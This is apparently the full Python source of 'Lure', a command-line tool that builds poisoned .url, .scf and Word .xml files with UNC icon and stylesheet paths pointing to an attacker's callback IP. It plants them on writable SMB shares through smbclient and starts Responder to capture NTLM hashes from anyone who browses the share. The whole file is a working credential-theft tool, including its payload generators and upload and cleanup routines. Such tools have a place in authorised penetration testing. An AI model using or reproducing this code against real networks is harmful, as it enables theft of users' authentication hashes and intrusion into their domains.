#!/usr/bin/env python3
"""Lure — SMB Hash Bait.

Subcommand CLI:

    lure drop      Drop bait files onto a share and (optionally) start Responder
    lure clean     Remove previously dropped bait from a share
    lure listen    Start Responder only (no upload)
    lure list      Enumerate shares on a target

See `lure <command> --help` for command-specific options.
"""

import argparse
import getpass
import os
import shlex
import shutil
import subprocess
import sys
from pathlib import Path

import colorama

from lure import __version__

# Catppuccin Mocha — water palette. Mutable so disable_colors() can blank them.
TEAL     = "\033[38;2;148;226;213m"
SKY      = "\033[38;2;137;220;235m"
SAPPHIRE = "\033[38;2;116;199;236m"
BLUE     = "\033[38;2;137;180;250m"
LAVENDER = "\033[38;2;180;190;254m"
# Status colors (Catppuccin Mocha)
GREEN    = "\033[38;2;166;227;161m"
YELLOW   = "\033[38;2;249;226;175m"
RED      = "\033[38;2;243;139;168m"
MAGENTA  = "\033[38;2;203;166;247m"
RESET    = "\033[0m"

PAYLOAD_TYPES = ("url", "scf", "xml")


# ---------------------------------------------------------------------------
# Color and banner
# ---------------------------------------------------------------------------

def disable_colors():
    """Blank every ANSI constant. Honors --no-color and $NO_COLOR."""
    global TEAL, SKY, SAPPHIRE, BLUE, LAVENDER
    global GREEN, YELLOW, RED, MAGENTA, RESET
    TEAL = SKY = SAPPHIRE = BLUE = LAVENDER = ""
    GREEN = YELLOW = RED = MAGENTA = RESET = ""


def _banner():
    print(TEAL     + "   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print(SKY      + "    _     _   _ ____  _____ ")
    print(SAPPHIRE + "   | |   | | | |  _ \\| ____|")
    print(BLUE     + "   | |   | | | | |_) |  _|  ")
    print(LAVENDER + "   | |___| |_| |  _ <| |___ ")
    print(SAPPHIRE + "   |_____|\\___/|_| \\_\\_____|")
    print(SKY      + "        ~ SMB Hash Bait ~     " + RESET)


# ---------------------------------------------------------------------------
# Prereq, user parsing, password resolution
# ---------------------------------------------------------------------------

def _check_prereqs(needs_responder=False):
    """Verify required system tools are on $PATH. Exit 4 if missing."""
    missing = []
    if shutil.which("smbclient") is None:
        missing.append("smbclient")
    if needs_responder and shutil.which("responder") is None:
        missing.append("responder")
    if missing:
        print(RED + f"Missing required tool(s) on $PATH: {', '.join(missing)}" + RESET)
        print(YELLOW + f"Install on Kali / Debian: sudo apt install {' '.join(missing)}" + RESET)
        sys.exit(4)


def parse_user(spec):
    """Split a user specification into (domain, user).

    Accepts: 'user', 'DOMAIN/user', 'DOMAIN\\user', 'user@DOMAIN.LOCAL'.
    Returns (None, None) when spec is None.
    """
    if spec is None:
        return None, None
    if "/" in spec:
        domain, user = spec.split("/", 1)
        return domain, user
    if "\\" in spec:
        domain, user = spec.split("\\", 1)
        return domain, user
    if "@" in spec:
        user, domain = spec.split("@", 1)
        return domain, user
    return None, spec


def resolve_password(args):
    """Pull password from --pass, $LURE_PASSWORD, or --ask-pass prompt.

    Resolution order: --pass > $LURE_PASSWORD > getpass() if --ask-pass > None.
    """
    explicit = getattr(args, "password", None)
    if explicit is not None:
        return explicit
    env = os.environ.get("LURE_PASSWORD")
    if env:
        return env
    if getattr(args, "ask_pass", False):
        return getpass.getpass("Password: ")
    return None


def _resolve_payload_types(spec):
    """Normalize -p/--payload values into an ordered list of types.

    Empty / None / 'all' → ['url', 'scf', 'xml']. Repeats are deduplicated.
    """
    if not spec:
        return list(PAYLOAD_TYPES)
    types = []
    for s in spec:
        if s == "all":
            return list(PAYLOAD_TYPES)
        if s in PAYLOAD_TYPES and s not in types:
            types.append(s)
    return types


# ---------------------------------------------------------------------------
# Payload generators
# ---------------------------------------------------------------------------

def make_url(callback, basename="@lure"):
    """Write an Internet shortcut payload that resolves an icon over UNC."""
    path = Path(f"{basename}.url")
    path.write_text(
        "[InternetShortcut]\n"
        "URL=whatever\n"
        "WorkingDirectory=whatever\n"
        f"IconFile=\\\\{callback}\\%USERNAME%.icon\n"
        "IconIndex=1\n"
    )
    print(GREEN + f"[+] Wrote {path}" + RESET)
    return path


def make_scf(callback, basename="@lure"):
    """Write a shell command link payload that resolves an icon over UNC."""
    path = Path(f"{basename}.scf")
    path.write_text(
        "[Shell]\n"
        "Command=2\n"
        f"IconFile=\\\\{callback}\\tools\\nc.ico\n"
        "[Taskbar]\n"
        "Command=ToggleDesktop\n"
    )
    print(GREEN + f"[+] Wrote {path}" + RESET)
    return path


def make_xml(callback, basename="@lure"):
    """Write a Word document payload pointing at a remote XSL over UNC."""
    path = Path(f"{basename}.xml")
    path.write_text(
        "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
        "<?mso-application progid='Word.Document'?>\n"
        f"<?xml-stylesheet type='text/xsl' href='\\\\{callback}\\lure.xsl' ?>\n"
    )
    print(GREEN + f"[+] Wrote {path}" + RESET)
    return path


# ---------------------------------------------------------------------------
# smbclient and responder wrappers
# ---------------------------------------------------------------------------

def _smb_auth_argv(user, password, domain):
    """Return the [-U principal --password ...] / [-N] suffix for smbclient."""
    if user is not None and password is not None:
        principal = f"{domain}/{user}" if domain else user
        return ["-U", principal, "--password", password]
    return ["-N"]


def smb_put(target, share, payloads, *, delete=False, sub_dir=None,
            user=None, password=None, domain=None, dry_run=False):
    """Upload (or delete) payload files on an SMB share via smbclient.

    Builds an argv list and invokes smbclient without a shell, so
    user-supplied values (target, share, sub_dir, credentials) cannot be
    interpreted as shell metacharacters.

    When delete=True, sends `del` commands instead of `put` — used by
    `lure clean` to remove previously dropped payloads.

    When dry_run=True, prints the smbclient command (shell-quoted, copy-
    pasteable) and returns 0 without invoking it.
    """
    cmd = ["smbclient", f"//{target}/{share}"]
    cmd.extend(_smb_auth_argv(user, password, domain))

    # smbclient -c takes a script in smbclient's own command grammar
    # (";" separates commands). Filenames are double-quoted so paths
    # with spaces survive.
    verb = "del" if delete else "put"
    script_parts = []
    if sub_dir:
        script_parts.append(f'cd "{sub_dir}"')
    script_parts.extend(f'{verb} "{p}"' for p in payloads)
    cmd.extend(["-c", "; ".join(script_parts)])

    action = "Deleting" if delete else "Uploading"
    target_str = f"//{target}/{share}" + (f"/{sub_dir}" if sub_dir else "")
    print(BLUE + f"[*] {action} {len(payloads)} payload(s) at {target_str}" + RESET)

    if dry_run:
        print(YELLOW + "[dry-run] " + RESET + " ".join(shlex.quote(c) for c in cmd))
        return 0
    return subprocess.run(cmd).returncode


def smb_list(target, *, user=None, password=None, domain=None, dry_run=False):
    """Enumerate shares on a target via `smbclient -L`."""
    cmd = ["smbclient", "-L", f"//{target}"]
    cmd.extend(_smb_auth_argv(user, password, domain))

    print(BLUE + f"[*] Enumerating shares on //{target}" + RESET)
    if dry_run:
        print(YELLOW + "[dry-run] " + RESET + " ".join(shlex.quote(c) for c in cmd))
        return 0
    return subprocess.run(cmd).returncode


def run_responder(iface):
    """Hand off to Responder on the given interface."""
    print(BLUE + f"[*] Starting Responder on {iface}" + RESET)
    return subprocess.run(["sudo", "responder", "-I", iface, "-wv"]).returncode


# ---------------------------------------------------------------------------
# Subcommand handlers
# ---------------------------------------------------------------------------

def _require_password_if_user(user, password):
    if user is not None and password is None:
        print(RED + "Need password (use --pass, --ask-pass, or set $LURE_PASSWORD)" + RESET)
        sys.exit(2)


def cmd_drop(args, parser):
    if not args.iface and not args.no_listen and not args.dry_run:
        parser.error("either -i/--iface IFACE or --no-listen is required")

    domain, user = parse_user(args.user)
    password = resolve_password(args)
    _require_password_if_user(user, password)

    types = _resolve_payload_types(args.payload)

    if not args.dry_run:
        needs_responder = not args.no_listen
        _check_prereqs(needs_responder=needs_responder)

    # Always compute the list of remote payload paths (used by smb_put).
    payload_paths = [Path(f"{args.name}.{ext}") for ext in types]

    # Generate local files unless we're in dry-run.
    if not args.dry_run:
        for ext in types:
            if ext == "url":
                make_url(args.callback, args.name)
            elif ext == "scf":
                make_scf(args.callback, args.name)
            elif ext == "xml":
                make_xml(args.callback, args.name)

    rc = smb_put(
        args.target, args.share, payload_paths,
        sub_dir=args.dir, user=user, password=password,
        domain=domain, dry_run=args.dry_run,
    )
    if rc != 0:
        print(RED + f"[-] smbclient exited with code {rc}" + RESET)
        sys.exit(rc)

    if args.dry_run:
        print(GREEN + "[+] Dry-run complete." + RESET)
        return
    if args.no_listen:
        print(GREEN + "[+] Payload(s) dropped. Skipping Responder (--no-listen)." + RESET)
        return
    run_responder(args.iface)


def cmd_clean(args, parser):
    domain, user = parse_user(args.user)
    password = resolve_password(args)
    _require_password_if_user(user, password)

    types = _resolve_payload_types(args.payload)
    if not args.dry_run:
        _check_prereqs(needs_responder=False)

    payload_paths = [Path(f"{args.name}.{ext}") for ext in types]

    rc = smb_put(
        args.target, args.share, payload_paths,
        delete=True, sub_dir=args.dir,
        user=user, password=password, domain=domain,
        dry_run=args.dry_run,
    )
    if rc != 0:
        print(RED + f"[-] smbclient exited with code {rc}" + RESET)
        sys.exit(rc)
    if args.dry_run:
        print(GREEN + "[+] Dry-run complete." + RESET)
        return
    print(GREEN + f"[+] Removed {len(payload_paths)} payload(s) from the share." + RESET)


def cmd_listen(args, parser):
    _check_prereqs(needs_responder=True)
    rc = run_responder(args.iface)
    sys.exit(rc)


def cmd_list(args, parser):
    domain, user = parse_user(args.user)
    password = resolve_password(args)
    _require_password_if_user(user, password)
    if not args.dry_run:
        _check_prereqs(needs_responder=False)
    rc = smb_list(args.target, user=user, password=password,
                  domain=domain, dry_run=args.dry_run)
    sys.exit(rc)


# ---------------------------------------------------------------------------
# Parser construction
# ---------------------------------------------------------------------------

def _add_auth_args(p):
    """User / password args shared by every SMB-touching subcommand."""
    p.add_argument("-u", "--user", metavar="USER",
                   help=("Username. Accepts 'user', 'DOMAIN/user', "
                         "'DOMAIN\\\\user', or 'user@DOMAIN.LOCAL' — "
                         "domain parses out automatically."))
    p.add_argument("--pass", dest="password", metavar="PASS",
                   help="Password (visible in ps; prefer --ask-pass or $LURE_PASSWORD)")
    p.add_argument("--ask-pass", dest="ask_pass", action="store_true",
                   help="Prompt for password interactively (no echo)")


def _add_target_args(p):
    """Target / share / dir args shared by drop and clean."""
    p.add_argument("-t", "--target", required=True, metavar="IP",
                   help="Target SMB server")
    p.add_argument("-s", "--share", required=True, metavar="NAME",
                   help="Target share name")
    p.add_argument("-d", "--dir", metavar="PATH",
                   help="Subdirectory inside the share (when root is read-only)")


def build_parser():
    parser = argparse.ArgumentParser(
        prog="lure",
        description="Lure — SMB Hash Bait. Drops poisoned .url/.scf/.xml "
                    "payloads onto writable SMB shares to coerce NTLM "
                    "authentication for capture by Responder.",
        epilog="Run 'lure <command> --help' for command-specific options.",
    )
    parser.add_argument("-V", "--version", action="version",
                        version=f"%(prog)s {__version__}")
    parser.add_argument("--no-color", dest="no_color", action="store_true",
                        help="Disable color output (also honors $NO_COLOR)")

    sub = parser.add_subparsers(dest="command", metavar="<command>")
    sub.required = True

    # ---- drop ----
    p_drop = sub.add_parser(
        "drop",
        help="Drop bait files onto a share and (optionally) start Responder",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    _add_target_args(p_drop)
    p_drop.add_argument("-c", "--callback", required=True, metavar="IP",
                        help="Attacker IP embedded in payload UNC paths")
    p_drop.add_argument("-p", "--payload", action="append",
                        choices=["url", "scf", "xml", "all"], metavar="TYPE",
                        help="Payload type: url, scf, xml, or all "
                             "(repeatable; default: all)")
    p_drop.add_argument("-i", "--iface", metavar="IFACE",
                        help="Network interface for Responder "
                             "(required unless --no-listen or --dry-run)")
    p_drop.add_argument("--name", default="@lure", metavar="BASE",
                        help="Custom payload basename (default keeps the @ "
                             "prefix to sort to the top of directory listings)")
    p_drop.add_argument("--no-listen", dest="no_listen", action="store_true",
                        help="Drop only — skip the Responder handoff "
                             "(use when you already have a listener)")
    p_drop.add_argument("--dry-run", dest="dry_run", action="store_true",
                        help="Print the smbclient command without writing or "
                             "uploading anything")
    _add_auth_args(p_drop)
    p_drop.set_defaults(func=cmd_drop)

    # ---- clean ----
    p_clean = sub.add_parser(
        "clean",
        help="Remove previously dropped bait from a share",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    _add_target_args(p_clean)
    p_clean.add_argument("-p", "--payload", action="append",
                         choices=["url", "scf", "xml", "all"], metavar="TYPE",
                         help="Which payloads to remove (repeatable; "
                              "default: all)")
    p_clean.add_argument("--name", default="@lure", metavar="BASE",
                         help="Match payloads with this basename")
    p_clean.add_argument("--dry-run", dest="dry_run", action="store_true",
                         help="Print the smbclient command without deleting "
                              "anything")
    _add_auth_args(p_clean)
    p_clean.set_defaults(func=cmd_clean)

    # ---- listen ----
    p_listen = sub.add_parser(
        "listen",
        help="Start Responder only (no upload)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p_listen.add_argument("-i", "--iface", required=True, metavar="IFACE",
                          help="Network interface for Responder")
    p_listen.set_defaults(func=cmd_listen)

    # ---- list ----
    p_list = sub.add_parser(
        "list",
        help="Enumerate shares on a target via 'smbclient -L'",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p_list.add_argument("-t", "--target", required=True, metavar="IP",
                        help="Target SMB server")
    p_list.add_argument("--dry-run", dest="dry_run", action="store_true",
                        help="Print the smbclient command without invoking it")
    _add_auth_args(p_list)
    p_list.set_defaults(func=cmd_list)

    return parser


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    colorama.just_fix_windows_console()
    parser = build_parser()

    if len(sys.argv) == 1:
        _banner()
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()

    if args.no_color or os.environ.get("NO_COLOR"):
        disable_colors()

    _banner()
    args.func(args, parser)


if __name__ == "__main__":
    main()
